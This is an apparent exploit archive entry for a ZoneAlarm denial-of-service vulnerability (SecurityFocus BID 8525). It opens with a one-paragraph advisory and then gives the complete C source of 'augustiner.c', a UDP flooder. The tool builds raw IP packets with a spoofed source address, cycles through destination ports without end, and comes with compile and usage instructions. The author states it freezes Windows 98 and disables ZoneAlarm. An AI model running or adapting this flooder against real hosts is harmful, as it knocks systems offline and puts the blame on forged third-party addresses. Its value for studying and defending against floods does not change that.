source: http://www.securityfocus.com/bid/8525/info
 
A denial of service vulnerability has been alleged in ZoneAlarm. It is reportedly possible to reproduce this condition by sending a flood of UDP packets of random sizes to random ports on a system hosting the vulnerable software.

/*
[------------------------------------------------------------------------]
[-- nologin - nologin - nologin -=]   [=- nologin - nologin - nologin  --]
[------------------------------------------------------------------------]
[-- Genre  : Denial of Service(DoS)                                    --]
[-- Name   : augustiner.c                                              --]
[-- Desc   : Udp flooder. Freezing Windows 98(not SE).                 --]
[--        :              DoS'ing Zonealarm                            --]
[-- Url    : www.nologin.org                                           --]
[-- Use    : gcc -o augustiner augustiner.c; ./augustiner              --]
[------------------------------------------------------------------------]
[-- Author : |WARL0RD|                                                 --]
[-- Date   : 8/2003                                                    --]
[-- Mod    : 9/2003                                                    --]
[------------------------------------------------------------------------]
[-- Comment: Win98 may be out of date, but it's still in widespread    --]
[--          use.                                                      --]
[--          This tool is for educational purposes only of course.     --]
[--          As of today this vuln seems unpatched.                    --]
[--          Ok after slightly modifying this code it finally has      --]
[--          the intended original effect of DoS'ing Zonealarm.        --]
[--          So augustiner.c is 2 DoS in 1. Congrats to Special        --]
[--          Discount Day.                                             --]
[------------------------------------------------------------------------]
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <netdb.h>
#include <errno.h>


#define PSEUHDR         sizeof(struct pseudohdr)
#define IP              struct iphdr
#define UDP             struct udphdr

extern int errno;


/***********************************************************/
void banner() {
        printf("\n\taugustiner.c\n");
        printf("\tVersion 1.1\n");
        printf("(c) warlord OF nologin.org\n");
        printf("Check www.nologin.org\n");
        printf("-----------------------------------\n");
return;
}

/**********************************************************/

void usage(char *name) {
        printf("Usage: %s <target> <source>\n",name);
        printf("The source address will be spoofed to what you specify\n");
        printf("Example: ./augustiner 192.168.0.1 www.microsoft.com\n");
exit(0);
}



/************************************************************/

unsigned short ipChecksum(unsigned short *ptr, int nbytes)
{
register long sum;
register u_short answer;
u_short oddbyte;

sum = 0;

while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }

if (nbytes == 1)
  {
    oddbyte = 0;
    *((u_char *) & oddbyte) = *(u_char *) ptr;
    sum += oddbyte;
  }

sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
answer = ~sum;

return (answer);
}



/*****************************************************************/




int sendUDP(int sock, char *dhost,char *shost)
{
  unsigned int packetLen, minimalLength;
  unsigned char packet[(packetLen = sizeof(IP) + sizeof(UDP)+100)];
  unsigned short ppp=0;
  IP *iphdr = (IP *)packet;
  UDP *udphdr = (UDP *)((unsigned char *)packet + sizeof(IP));
  struct sockaddr_in s;
  struct hostent *he;


 srand(time(NULL));
 unsigned char minimalip[(minimalLength = 12 + sizeof(UDP))];
 memset(&s, 0, sizeof(s));
 memset(packet, 0, packetLen);
 memset(minimalip, 0, minimalLength);

 if((he=gethostbyname(shost))==NULL)
   {
     *((unsigned long *)((unsigned char *)minimalip+0)) = inet_addr(shost);
   }
  else
   {
     *((unsigned long*)((unsigned char *)minimalip+0)) = *((char *)he->h_addr);
   }


 if((he=gethostbyname(dhost))==NULL)
   {
     *((unsigned long *)((unsigned char *)minimalip+0)) = inet_addr(dhost);
   }
  else
   {
     *((unsigned long*)((unsigned char *)minimalip+0)) = *((char *)he->h_addr);
   }

 *((unsigned char *)((unsigned char *)minimalip+8)) = 0;
 *((unsigned char *)((unsigned char *)minimalip+9)) = IPPROTO_UDP;
 *((unsigned short *)((unsigned char *)minimalip+10)) = htons(packetLen - sizeof(IP));
 iphdr->version       = 4;
 iphdr->ihl      = 5;
 iphdr->id      = 60000;
 iphdr->frag_off = 0;

// iphdr->frag_off = 2050;

 if ((iphdr->saddr = inet_addr(shost)) == (unsigned long)-1)
  {
    if (!(he = gethostbyname(shost)))
      {
        printf("Couldn't resolve the src host\n");
        exit(0);
      }
    memcpy(&iphdr->saddr, he->h_addr, sizeof(iphdr->saddr));
  }

 if ((iphdr->daddr = inet_addr(dhost)) == (unsigned long)-1)
  {
    if (!(he = gethostbyname(dhost)))
      {
        printf("Couldn't resolve the dst host\n");
        exit(0);
      }
    memcpy(&iphdr->daddr, he->h_addr, sizeof(iphdr->daddr));
  }

 iphdr->protocol       = IPPROTO_UDP;
 iphdr->ttl     = 255;
 iphdr->tot_len     = packetLen;
 iphdr->check     = ipChecksum((u_short *)iphdr, sizeof(IP));
 s.sin_family      = AF_INET;

 if((he=gethostbyname(dhost))==NULL)
   {
     s.sin_addr.s_addr=inet_addr(dhost);
   }
  else
   {
     s.sin_addr=*((struct in_addr *)he->h_addr);
   }

while(1)
  {
    ppp++;
    udphdr->source = htons(20000);
    udphdr->dest =   htons(ppp);
    udphdr->len   = htons(8);
    udphdr->check = 0;

    sendto(sock, packet, packetLen, 0, (struct sockaddr *)&s, sizeof(s));
  }
 return 0;
}


/***********************************************************/



int main(int argc, char **argv) {
int sock, optval=1;

        banner();

        if(argc<3) usage(argv[0]);

        sock = socket(AF_INET,SOCK_RAW,IPPROTO_UDP);
        setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&optval,sizeof(optval));

        printf("Flooding %s with udp packets.\n",argv[1]);
        printf("Press Ctrl+C to stop\n");

        sendUDP(sock, argv[1], argv[2]);

        close(sock);

exit(0);
}

